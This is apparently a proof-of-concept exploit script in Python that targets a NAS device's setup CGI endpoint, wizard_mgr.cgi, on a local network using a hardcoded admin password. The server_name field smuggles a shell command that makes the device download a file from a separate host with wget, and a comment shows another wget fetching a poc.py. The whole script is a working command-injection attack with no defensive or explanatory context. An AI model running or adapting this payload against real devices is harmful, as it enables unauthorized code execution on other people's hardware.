import requests

url = "http://192.168.31.10/cgi-bin/wizard_mgr.cgi"

headers = {
}

data = {
    "cmd": "cgi_wizard",
    "pwd": "admin123",
          "timezone": "8",
          "dhcp_enable": "0",
          "ip": "192.168.31.10",
          "gateway": "192.168.31.1",
          "netmask": "255.255.255.0",
          "dns1": "8.8.8.8",
          "dns2": "8.8.4.4",
          "work_group": "WORKGROUP",
          "server_name": ";wget http://192.168.31.215:8000/hack.txt -O /tmp/hack.txt;",
          "server_description": "NAS_Server"
}

# wget http://192.168.31.166:8876/poc.py

response = requests.post(
    url,
    headers=headers,
    data=data,
    timeout=10
)

print("Status:", response.status_code)
print("Response:")
print(response.text)

